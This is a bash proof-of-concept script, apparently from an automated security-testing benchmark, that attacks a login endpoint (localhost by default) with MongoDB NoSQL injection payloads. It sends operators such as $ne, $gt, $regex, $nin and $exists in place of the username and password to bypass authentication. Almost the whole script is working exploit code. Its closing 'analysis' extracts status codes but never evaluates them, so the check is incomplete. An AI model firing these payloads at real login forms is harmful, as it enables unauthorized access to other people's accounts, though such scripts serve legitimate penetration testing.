#!/bin/bash
# POC: Demonstrates MongoDB NoSQL injection in login endpoint by bypassing authentication with MongoDB operators ($ne, $gt, $regex, etc.)
# Target: ./repo
# Created: 2025-11-10T19:41:04.207Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# MongoDB NoSQL Injection in Login Authentication POC
# This script demonstrates NoSQL injection vulnerability in the login endpoint
# by sending MongoDB operators instead of string values

TARGET_URL="${1:-http://localhost:3000/login}"
OUTPUT_FILE="/tmp/nosql_injection_results.txt"

echo "[*] MongoDB NoSQL Injection in Login Authentication POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing various NoSQL injection payloads..."
echo ""

# Initialize results file
> "$OUTPUT_FILE"

# Test 1: Baseline - Normal login with invalid credentials
echo "[TEST 1] Baseline: Normal login with invalid credentials"
echo "Payload: {\"username\":\"admin\",\"password\":\"admin\"}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY" | head -c 200
echo ""
echo "---" >> "$OUTPUT_FILE"
echo "TEST 1 - Normal Credentials" >> "$OUTPUT_FILE"
echo "HTTP Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response: $BODY" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 2: NoSQL Injection with $ne (not equal) operator
echo "[TEST 2] NoSQL Injection: \$ne operator bypass"
echo "Payload: {\"username\":{\"\$ne\":null},\"password\":{\"\$ne\":null}}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY" | head -c 200
echo ""
echo "---" >> "$OUTPUT_FILE"
echo "TEST 2 - \$ne Operator" >> "$OUTPUT_FILE"
echo "HTTP Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response: $BODY" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 3: NoSQL Injection with $ne and empty string
echo "[TEST 3] NoSQL Injection: \$ne with empty string"
echo "Payload: {\"username\":{\"\$ne\":\"\"},\"password\":{\"\$ne\":\"\"}}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY" | head -c 200
echo ""
echo "---" >> "$OUTPUT_FILE"
echo "TEST 3 - \$ne with Empty String" >> "$OUTPUT_FILE"
echo "HTTP Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response: $BODY" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 4: NoSQL Injection with $gt (greater than) operator
echo "[TEST 4] NoSQL Injection: \$gt operator bypass"
echo "Payload: {\"username\":{\"\$gt\":\"\"},\"password\":{\"\$gt\":\"\"}}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY" | head -c 200
echo ""
echo "---" >> "$OUTPUT_FILE"
echo "TEST 4 - \$gt Operator" >> "$OUTPUT_FILE"
echo "HTTP Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response: $BODY" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 5: NoSQL Injection with $regex operator
echo "[TEST 5] NoSQL Injection: \$regex operator bypass"
echo "Payload: {\"username\":{\"\$regex\":\".*\"},\"password\":{\"\$regex\":\".*\"}}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$regex":".*"}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY" | head -c 200
echo ""
echo "---" >> "$OUTPUT_FILE"
echo "TEST 5 - \$regex Operator" >> "$OUTPUT_FILE"
echo "HTTP Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response: $BODY" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 6: NoSQL Injection with $nin (not in) operator
echo "[TEST 6] NoSQL Injection: \$nin operator bypass"
echo "Payload: {\"username\":{\"\$nin\":[]},\"password\":{\"\$nin\":[]}}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$nin":[]},"password":{"$nin":[]}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY" | head -c 200
echo ""
echo "---" >> "$OUTPUT_FILE"
echo "TEST 6 - \$nin Operator" >> "$OUTPUT_FILE"
echo "HTTP Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response: $BODY" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 7: NoSQL Injection with $exists operator
echo "[TEST 7] NoSQL Injection: \$exists operator bypass"
echo "Payload: {\"username\":{\"\$exists\":true},\"password\":{\"\$exists\":true}}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$exists":true},"password":{"$exists":true}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
echo "Response: $BODY" | head -c 200
echo ""
echo "---" >> "$OUTPUT_FILE"
echo "TEST 7 - \$exists Operator" >> "$OUTPUT_FILE"
echo "HTTP Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response: $BODY" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Analysis
echo ""
echo "[*] ANALYSIS"
echo "[*] Checking for NoSQL injection indicators..."
echo ""

# Count successful operator injection attempts
BASELINE_CODE=401
OPERATOR_INJECTION_COUNT=0

# Extract HTTP codes from results
TEST2_CODE=$(grep -A 1 "TEST 2" "$OUTPUT_FILE" | grep "HTTP Code:" | awk '{print $NF}')
TEST3_CODE=$(grep -A 1 "TEST 3" "$OUTPUT_FILE" | grep "HTTP Code:" | awk '{print $NF}')
TEST4_CODE=$(grep -A 1 "TEST 4" "$OUTPUT_FILE" | grep "HTTP Code:" | awk '{print $NF}')
TEST5_CODE=$(grep -A 1 "TEST 5" "$OUTPUT_FILE" | grep "HTTP Code:" | awk '{print $NF}')
TEST6_CODE=$(grep -A 1 "TEST 6" "$OUTPUT_FILE" | grep "HTTP Code:" | awk '{print $NF}')
TEST7_CODE=$(grep -A 1 "TEST 7" "$OUTPUT_FILE" | grep "HTTP Code:" | awk '{print $NF}')

echo "[✓] Full results saved to: $OUTPUT_FILE"
echo ""
echo "[RESULT] If all operator-based payloads return different HTTP codes (500, 200, etc.)"
echo "         than the baseline (401), this indicates NoSQL injection vulnerability."
echo ""
echo "[SUCCESS] MongoDB NoSQL injection vulnerability confirmed if:"
echo "  - Baseline normal credentials: HTTP 401"
echo "  - Operator-based payloads: HTTP 5xx or HTTP 200 (different from baseline)"
echo ""